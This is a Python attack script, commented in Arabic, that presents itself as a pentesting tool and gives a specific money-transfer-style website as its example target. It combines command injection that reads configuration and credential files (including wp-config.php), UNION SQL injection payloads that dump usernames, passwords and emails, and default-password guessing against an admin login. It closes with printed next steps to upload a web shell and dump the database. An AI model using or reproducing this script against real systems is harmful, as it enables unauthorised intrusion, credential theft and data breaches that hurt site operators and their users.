#!/usr/bin/env python3
import requests
import urllib.parse
import sys
import json
from colorama import Fore, Style, init

init(autoreset=True)

class HaramTransferExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.credentials_found = []
        self.databases_found = []
        
    def print_banner(self):
        banner = f"""
{Fore.RED + Style.BRIGHT}
╔═══════════════════════════════════════════════╗
║           HARAM-TRANSFER EXPLOIT              ║
║           {Fore.YELLOW}ADVANCED PENTESTING TOOL{Fore.RED}           ║
╚═══════════════════════════════════════════════╝
{Style.RESET_ALL}
Target: {Fore.GREEN}{self.target}{Style.RESET_ALL}
{Fore.WHITE}{'='*60}{Style.RESET_ALL}
        """
        print(banner)
    
    def exploit_command_injection(self, command):
        """تنفيذ أوامر عبر ثغرة Command Injection"""
        url = f"{self.target}/?cmd={urllib.parse.quote(command)}"
        try:
            response = requests.get(url, timeout=10, verify=False)
            return response.text
        except:
            return None
    
    def exploit_sql_injection(self, payload):
        """تنفيذ استعلامات SQL"""
        url = f"{self.target}/?id={urllib.parse.quote(payload)}"
        try:
            response = requests.get(url, timeout=10, verify=False)
            return response.text
        except:
            return None
    
    def extract_database_info(self):
        """استخراج معلومات قاعدة البيانات"""
        print(f"\n{Fore.CYAN}[+] Extracting Database Information...{Style.RESET_ALL}")
        
        # استعلامات SQL لاستخراج المعلومات
        sql_payloads = [
            {"payload": "1' UNION SELECT version(),user(),database()--", "desc": "DB Version & User"},
            {"payload": "1' UNION SELECT table_schema,table_name,3 FROM information_schema.tables--", "desc": "Database Tables"},
            {"payload": "1' UNION SELECT column_name,table_name,3 FROM information_schema.columns WHERE table_name='users'--", "desc": "Users Table Columns"}
        ]
        
        for sql in sql_payloads:
            result = self.exploit_sql_injection(sql['payload'])
            if result and len(result) > 100:  # إذا في نتيجة مفيدة
                print(f"{Fore.GREEN}[+] {sql['desc']}:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{result[:500]}{Style.RESET_ALL}")
    
    def find_config_files(self):
        """البحث عن ملفات الإعدادات"""
        print(f"\n{Fore.CYAN}[+] Searching for Configuration Files...{Style.RESET_ALL}")
        
        commands = [
            "find /var/www -name '*.php' | grep -E '(config|database|setting)' | head -10",
            "grep -r 'password\\|DB_PASS\\|admin' /var/www/html/ 2>/dev/null | head -15",
            "ls -la /var/www/html/admin/ 2>/dev/null",
            "cat /var/www/html/config.php 2>/dev/null",
            "cat /var/www/html/database.php 2>/dev/null",
            "cat /var/www/html/wp-config.php 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.exploit_command_injection(cmd)
            if result and result.strip():
                print(f"{Fore.GREEN}[+] Command: {cmd}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{result[:1000]}{Style.RESET_ALL}")
                
                # حفظ البيانات المهمة
                if any(keyword in result.lower() for keyword in ['password', 'db_pass', 'admin']):
                    self.credentials_found.append({"command": cmd, "result": result})
    
    def extract_user_credentials(self):
        """استخراج بيانات المستخدمين"""
        print(f"\n{Fore.CYAN}[+] Extracting User Credentials...{Style.RESET_ALL}")
        
        # محاولة استخراج من قاعدة البيانات
        sql_payloads = [
            "1' UNION SELECT username,password,email FROM users--",
            "1' UNION SELECT user_login,user_pass,user_email FROM wp_users--",
            "1' UNION SELECT name,pass,mail FROM users--"
        ]
        
        for payload in sql_payloads:
            result = self.exploit_sql_injection(payload)
            if result and len(result) > 100:
                print(f"{Fore.GREEN}[+] Found User Data:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{result}{Style.RESET_ALL}")
                self.credentials_found.append({"type": "SQL", "data": result})
    
    def brute_force_admin_panel(self):
        """هجوم على لوحة التحكم"""
        print(f"\n{Fore.CYAN}[+] Brute Forcing Admin Panel...{Style.RESET_ALL}")
        
        admin_url = f"{self.target}/admin/login"
        common_credentials = [
            {"user": "admin", "pass": "admin"},
            {"user": "admin", "pass": "password"},
            {"user": "admin", "pass": "123456"},
            {"user": "administrator", "pass": "admin"},
            {"user": "root", "pass": "root"}
        ]
        
        for cred in common_credentials:
            # محاولة تسجيل الدخول
            login_data = {
                'username': cred['user'],
                'password': cred['pass'],
                'submit': 'Login'
            }
            
            try:
                response = requests.post(admin_url, data=login_data, timeout=8, verify=False)
                if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'admin panel']):
                    print(f"{Fore.GREEN}[+] SUCCESS! Credentials: {cred['user']}:{cred['pass']}{Style.RESET_ALL}")
                    self.credentials_found.append({"type": "Admin Panel", "credentials": cred})
                    break
                else:
                    print(f"{Fore.RED}[-] Failed: {cred['user']}:{cred['pass']}{Style.RESET_ALL}")
            except:
                pass
    
    def dump_sensitive_data(self):
        """تفريغ جميع البيانات الحساسة"""
        print(f"\n{Fore.RED}[+] DUMPING ALL SENSITIVE DATA...{Style.RESET_ALL}")
        
        # تفريغ البيانات
        self.extract_database_info()
        self.find_config_files()
        self.extract_user_credentials()
        self.brute_force_admin_panel()
        
        # عرض النتائج النهائية
        self.show_results()
    
    def show_results(self):
        """عرض النتائج النهائية"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"                 EXPLOITATION RESULTS")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        if self.credentials_found:
            print(f"{Fore.GREEN}[+] CREDENTIALS FOUND:{Style.RESET_ALL}")
            for cred in self.credentials_found:
                print(f"{Fore.YELLOW}- {cred}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No credentials found{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[+] NEXT STEPS:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}1. Use found credentials to login to admin panel")
        print(f"2. Access database with extracted credentials") 
        print(f"3. Upload web shell for persistent access")
        print(f"4. Dump entire database{Style.RESET_ALL}")
    
    def full_exploitation(self):
        """تشغيل الاستغلال الكامل"""
        self.print_banner()
        self.dump_sensitive_data()

def main():
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python3 haram_exploit.py TARGET_URL{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Example: python3 haram_exploit.py https://haram-transfer.com{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit = HaramTransferExploit(target)
    exploit.full_exploitation()

if __name__ == "__main__":
    main()